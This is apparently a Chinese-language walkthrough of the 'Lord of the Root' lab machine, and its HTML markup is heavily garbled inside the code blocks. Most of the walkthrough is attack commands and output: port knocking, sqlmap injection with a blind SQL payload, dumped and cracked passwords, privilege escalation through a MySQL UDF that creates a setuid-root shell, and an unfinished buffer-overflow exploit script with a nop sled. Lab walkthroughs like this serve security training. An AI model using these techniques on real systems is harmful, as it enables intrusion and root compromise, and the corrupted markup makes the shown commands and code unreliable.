<span class="p">|</span>      <span class="p">&amp;</span>lt<span class="p">;</span>  /    <span class="se">\ </span>/  _ _/ &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span>  <span class="p">|</span>/ /  <span class="p">|</span>    &lt;/strong&gt;<span class="o">)</span> _  &lt;/strong&gt; <span class="se">\ </span> <span class="p">|</span>/ &lt;/strong&gt; <span class="se">\ </span>/    <span class="se">\ </span> / &lt;strong&gt; <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span> /  _ <span class="se">\ </span>  <span class="p">|</span>    &lt;/strong&gt;<span class="o">)</span>&lt;/em&gt; /    <span class="se">\ </span>  &lt;strong&gt;<span class="se">\/</span> &lt;/strong&gt; _  &lt;strong&gt; <span class="se">\</span>
<span class="p">|</span>    <span class="p">|</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  _&lt;/strong&gt;<span class="p">|</span>    <span class="p">&amp;</span>lt<span class="p">;</span>   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> &lt;strong&gt;&lt;em&gt;/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /&lt;/em&gt;/ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span><span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="p">|</span>        <span class="se">\ </span>  <span class="p">|</span>  <span class="se">\ </span> <span class="p">|</span> <span class="se">\ </span> &lt;/strong&gt;&lt;em&gt;/<span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>
<span class="p">|</span>&lt;/em&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt; _&lt;strong&gt;<span class="p">|</span>  /_&lt;/strong&gt;&lt;/em&gt;/ _&lt;strong&gt;  &gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt; <span class="se">\ </span> _&lt;strong&gt;  /   <span class="p">|</span>&lt;/strong&gt;<span class="p">|</span>  <span class="p">|</span>&lt;strong&gt;<span class="p">|</span>_&lt;/strong&gt;  &gt;&lt;/em&gt;&lt;strong&gt;<span class="p">|</span>  /_&lt;/strong&gt;&lt;em&gt; <span class="p">|</span>    <span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span> _&lt;/em&gt;&lt;/strong&gt;/  /&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;  /&lt;/em&gt;&lt;/strong&gt;<span class="p">|</span>  /&lt;/strong&gt;<span class="p">|</span>  _&lt;/strong&gt;  &gt;__<span class="p">|</span>
        <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                           <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>
Easy as 1,2,3</code></pre></div></p>

<p>&ldquo;Knock Friend To Enter&rdquo; 看來第一關是<a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a></p>

<p>敲完門之後，nmap再掃一次就多了一個新的port</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">1337/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span></code></pre></div></p>

<p>連上網站後，只有三張魔戒的meme</p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/iwilldoit.jpg"></p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/hipster.jpg"></p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/legolas.jpg"></p>

<p>抓下來細看一下，裡面好像沒有藏甚麼資訊</p>

<p>接著想看一下robots.txt有沒有擋調特別的路徑，卻出現了下面的特出景象</p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/robots.png"></p>

<p>而且原始碼內還有一個神祕的字串</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;html&gt;
&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://newdominic.github.io/images/hipster.jpg&quot;</span> <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;middle&quot;</span>&gt;&lt;/p&gt;

&lt;p&gt;&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;
&lt;/html&gt;</code></pre></div></p>

<p>用base64解碼之後得到了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">Lzk3ODM0NTIxMC9pbmRleC5waHA</span><span class="o">=</span> Closer!</code></pre></div></p>

<p>再解一次之後得到</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">/978345210/index.php</code></pre></div></p>

<p>於是我們來到了魔鐸之門 (?</p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/gom.png"></p>

<p>看到這麼陽春的登入畫面，推測應該是用SQL injection打無誤(?</p>

<p>簡單試過一些基本的SQLi語句卻都沒有效果</p>

<p>只好求助sqlmap大神</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# sqlmap <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">url</span><span class="o">=</span><span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://192.168.0.121:1337/978345210/index.php&quot;</span>&gt;http://192.168.0.121:1337/978345210/index.php&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">data</span><span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">username</span><span class="o">=</span>asd<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">password</span><span class="o">=</span>asd<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">submit</span><span class="o">=</span> Login<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>dump-all <span class="p">&amp;</span>ndash<span class="p">;</span>level 5
<span class="p">&amp;</span>hellip<span class="p">;</span>
<span class="o">[</span>11:40:29<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="p">&amp;</span>lsquo<span class="p">;</span>MySQL &gt; 5.0.11 AND <span class="nb">time</span>-based blind<span class="p">&amp;</span>rsquo<span class="p">;</span>
<span class="o">[</span>11:41:19<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> POST parameter <span class="p">&amp;</span>lsquo<span class="p">;</span>username<span class="p">&amp;</span>rsquo<span class="p">;</span> seems to be <span class="p">&amp;</span>lsquo<span class="p">;</span>MySQL &gt; 5.0.11 AND <span class="nb">time</span>-based blind<span class="p">&amp;</span>rsquo<span class="p">;</span> injectable
<span class="p">&amp;</span>hellip<span class="p">;</span>
<span class="o">[</span>11:41:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> checking <span class="k">if</span> the injection point on POST parameter <span class="p">&amp;</span>lsquo<span class="p">;</span>username<span class="p">&amp;</span>rsquo<span class="p">;</span> is a <span class="nb">false </span>positive
POST parameter <span class="p">&amp;</span>lsquo<span class="p">;</span>username<span class="p">&amp;</span>rsquo<span class="p">;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span>&lt;/p&gt;

&lt;h2&gt;sqlmap identified the following injection points with a total of <span class="m">2094</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:&lt;/h2&gt;

&lt;p&gt;Place: POST
Parameter: username
    Type: AND/OR <span class="nb">time</span>-based blind
    Title: MySQL &gt; 5.0.11 AND <span class="nb">time</span>-based blind&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Payload: <span class="nv">username</span><span class="o">=</span>asd<span class="s1">&#39;||(SELECT &#39;</span>NAyM<span class="s1">&#39; FROM DUAL WHERE 8495=8495 AND SLEEP(5) )||&#39;</span><span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">password</span><span class="o">=</span>asd<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">submit</span><span class="o">=</span> Login
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;<span class="o">[</span>11:46:08<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11</code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>12:09:03<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> starting dictionary-based cracking <span class="o">(</span>mysql_passwd<span class="o">)</span>
<span class="o">[</span>12:09:13<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> cracked password <span class="p">&amp;</span>lsquo<span class="p">;</span>darkshadow<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="k">for</span> user <span class="p">&amp;</span>lsquo<span class="p">;</span>root<span class="p">&amp;</span>rsquo<span class="p">;</span>
database management system users password hashes:
<span class="o">[</span>&lt;em&gt;<span class="o">]</span> debian-sys-maint <span class="o">[</span>1<span class="o">]</span>:
    password <span class="nb">hash</span>: &lt;/em&gt;A55A9B9049F69BC2768C9284615361DFBD580B34
<span class="o">[</span>&lt;em&gt;<span class="o">]</span> root <span class="o">[</span>1<span class="o">]</span>:
    password <span class="nb">hash</span>: &lt;/em&gt;4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
    clear-text password: darkshadow</code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>09:50:20<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching columns <span class="k">for</span> table <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span> in database <span class="p">&amp;</span>lsquo<span class="p">;</span>Webapp<span class="p">&amp;</span>rsquo<span class="p">;</span>
<span class="p">&amp;</span>hellip<span class="p">;</span>
+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span> id <span class="p">|</span> username <span class="p">|</span> password         <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> frodo    <span class="p">|</span> iwilltakethering <span class="p">|</span>
<span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> smeagol  <span class="p">|</span> MyPreciousR00t   <span class="p">|</span>
<span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> aragorn  <span class="p">|</span> AndMySword       <span class="p">|</span>
<span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> legolas  <span class="p">|</span> AndMyBow         <span class="p">|</span>
<span class="p">|</span> <span class="m">5</span>  <span class="p">|</span> gimli    <span class="p">|</span> AndMyAxe         <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+</code></pre></div></p>

<p>成功把資料庫dump出來</p>

<p>裡面有一張表看起來有點用處的帳號+密碼組合</p>

<p>還得到了mysql內root的密碼為darkshadow</p>

<p>拿這些帳號密碼去嘗試登入ssh，最後成功使用smeagol登入</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com/&quot;</span>&gt;https://help.ubuntu.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;261 packages can be updated.
<span class="m">128</span> updates are security updates.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                        .____    _____________________________
                        <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
                        <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
                        <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
                        <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
                                <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; &lt;strong&gt;      &lt;/strong&gt;       .&lt;strong&gt;                                &lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt;      .&lt;/strong&gt;                   .&lt;/strong&gt;&lt;/em&gt;
/  <span class="se">\ </span>   /  <span class="se">\ </span>&lt;/strong&gt;&lt;/strong&gt; <span class="p">|</span>  <span class="p">|</span>   &lt;strong&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/strong&gt;   &lt;em&gt;&lt;strong&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;/strong&gt;   _   &lt;/em&gt;&lt;strong&gt;&lt;strong&gt;/&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;<span class="p">|</span> &lt;strong&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;/strong&gt;    &lt;strong&gt;<span class="p">|</span> _/
<span class="se">\ </span>  <span class="se">\/\/</span>   // &lt;/strong&gt; <span class="p">|</span>  <span class="p">|</span> &lt;em&gt;/ &lt;/em&gt;&lt;strong&gt;<span class="se">\/</span>  _ <span class="se">\ </span>/     _/ &lt;/strong&gt; <span class="se">\ </span>  <span class="p">|</span>    &lt;strong&gt;<span class="o">)</span> _  &lt;/strong&gt; <span class="se">\ </span> <span class="p">|</span>/ &lt;strong&gt; <span class="se">\ </span>/    <span class="se">\ </span> / &lt;/strong&gt; <span class="p">|</span>
 <span class="se">\ </span>       /<span class="se">\ </span> &lt;strong&gt;&lt;em&gt;/<span class="p">|</span>  <span class="p">|</span>&lt;/em&gt;<span class="se">\ </span> _&lt;em&gt;<span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  Y Y  <span class="se">\ </span> &lt;/em&gt;&lt;/strong&gt;/   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> &lt;strong&gt;&lt;em&gt;/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /&lt;/em&gt;/ <span class="p">|</span>
  __/<span class="se">\ </span> /  _&lt;/strong&gt;  &gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;/_&lt;/strong&gt;  &gt;&lt;/em&gt;&lt;/em&gt;&lt;strong&gt;/<span class="p">|</span>&lt;/strong&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>  /_&lt;strong&gt;  &gt;  _&lt;/strong&gt;  /   <span class="p">|</span>&lt;strong&gt;<span class="p">|</span>  <span class="p">|</span>&lt;/strong&gt;<span class="p">|</span>_&lt;strong&gt;  &gt;&lt;/strong&gt;&lt;/em&gt;<span class="p">|</span>  /____ <span class="p">|</span>
       <span class="se">\/</span>       <span class="se">\/</span>          <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>       <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>
Last login: Tue Sep <span class="m">22</span> 12:59:38 <span class="m">2015</span> from 192.168.55.135
smeagol@LordOfTheRoot:~<span class="err">$</span></code></pre></div></p>

<p>再來登入mysql，試試看之前看過的<a href="http://www.0xdeadbeef.info/exploits/raptor_udf2.c">MySQL UDF Exploit</a>有沒有效果</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> do_system<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>cp /bin/sh /home/smeagol/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span> do_system<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>cp /bin/sh /home/smeagol/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span>                                        <span class="m">0</span> <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>&lt;/p&gt;

&lt;p&gt;mysql&gt; <span class="k">select</span> do_system<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>chmod <span class="m">4777</span> /home/smeagol/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span> do_system<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>chmod <span class="m">4777</span> /home/smeagol/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span>                                        <span class="m">0</span> <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+</code></pre></div></p>

<p>接著來看看成果</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:~<span class="nv">$ </span>ls -al
<span class="p">&amp;</span>hellip<span class="p">;</span>
-rwsrwxrwx  <span class="m">1</span> root    root    <span class="m">112204</span> Dec <span class="m">26</span> 16:43 bash
<span class="p">&amp;</span>hellip<span class="p">;</span>
smeagol@LordOfTheRoot:~<span class="nv">$ </span>./sh
bash-4.3<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
bash-4.3<span class="nv">$ </span>cat /root/Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf</code></pre></div></p>

<p>成功拿下魔戒的root！不過總覺得用這個方法拿到root有點太過輕鬆</p>

<p>於是簡單地檢查了一下，最後找到了三支奇怪的程式</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
<span class="p">&amp;</span>hellip<span class="p">;</span>
-rwsr-xr-x <span class="m">1</span> root root <span class="m">5150</span> Sep <span class="m">22</span> 13:01 /SECRET/door2/file
-rwsr-xr-x <span class="m">1</span> root root <span class="m">7370</span> Sep <span class="m">17</span> 23:08 /SECRET/door1/file
-rwsr-xr-x <span class="m">1</span> root root <span class="m">7370</span> Sep <span class="m">17</span> 23:08 /SECRET/door3/file</code></pre></div></p>

<p>而且這命名看起來才飽含了作者對魔戒的愛，從這邊拿下root應該才是作者所希望的解法。</p>

<p>這三個file檔分別放在door1, door2, door3三個目錄下</p>

<p>其中兩支看起來似乎是同一支程式，而且執行之後沒做甚麼事情就結束了</p>

<p>剩下的一支可以傳入參數達到Buffer Overflow的效果</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root/door3# objdump -D file <span class="p">|</span> grep -A30 main.:
0804845d &lt;main&gt;:
 804845d:       <span class="m">55</span>                      push   %ebp
 804845e:       <span class="m">89</span> e5                   mov    %esp,%ebp
 8048460:       <span class="m">83</span> e4 f0                and    <span class="nv">$0xfffffff0</span>,%esp
 8048463:       <span class="m">81</span> ec b0 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       sub    <span class="nv">$0xb0</span>,%esp
 8048469:       <span class="m">83</span> 7d <span class="m">08</span> <span class="m">01</span>             cmpl   <span class="nv">$0x1</span>,0x8<span class="o">(</span>%ebp<span class="o">)</span>
 804846d:       7f <span class="m">21</span>                   jg     <span class="m">8048490</span> <span class="p">&amp;</span>lt<span class="p">;</span>main+0x33&gt;
 804846f:       8b <span class="m">45</span> 0c                mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
 8048472:       8b <span class="m">00</span>                   mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
 8048474:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
 8048478:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">40</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>    movl   <span class="nv">$0x8048540</span>,<span class="o">(</span>%esp<span class="o">)</span>
 804847f:       e8 8c fe ff ff          call   <span class="m">8048310</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">printf</span>@plt&gt;
 8048484:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    movl   <span class="nv">$0x0</span>,<span class="o">(</span>%esp<span class="o">)</span>
 804848b:       e8 b0 fe ff ff          call   <span class="m">8048340</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">exit</span>@plt&gt;
 8048490:       8b <span class="m">45</span> 0c                mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
 8048493:       <span class="m">83</span> c0 <span class="m">04</span>                add    <span class="nv">$0x4</span>,%eax
 8048496:       8b <span class="m">00</span>                   mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
 8048498:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
 804849c:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">11</span>             lea    0x11<span class="o">(</span>%esp<span class="o">)</span>,%eax
 80484a0:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
 80484a3:       e8 <span class="m">78</span> fe ff ff          call   <span class="m">8048320</span> <span class="p">&amp;</span>lt<span class="p">;</span>strcpy@plt&gt;
 80484a8:       b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
 80484ad:       c9                      leave
 80484ae:       c3                      ret</code></pre></div></p>

<p>接著用pattern_create.rb和pattern_offset.rb找出EIP的注入點</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root/door3# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41376641
<span class="o">[</span>*<span class="o">]</span> Exact match at offset 171</code></pre></div></p>

<p>再來先檢查目標端的ASLR有沒有開啟</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:/SECRET/door3<span class="nv">$ </span>cat /proc/sys/kernel/randomize_va_space
2</code></pre></div></p>

<p>ASLR是開著的，看來要靠nop-sled拼人品了</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">nopsled</span> <span class="o">=</span> <span class="mi">20000</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="mi">171</span>               <span class="c"># trash</span>
<span class="n">payload</span><span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x2e</span>\<span class="n">xb0</span>\<span class="n">xbf</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c"># EIP</span>
<span class="n">payload</span><span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x90</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">nopsled</span>        <span class="c"># nop sled</span>
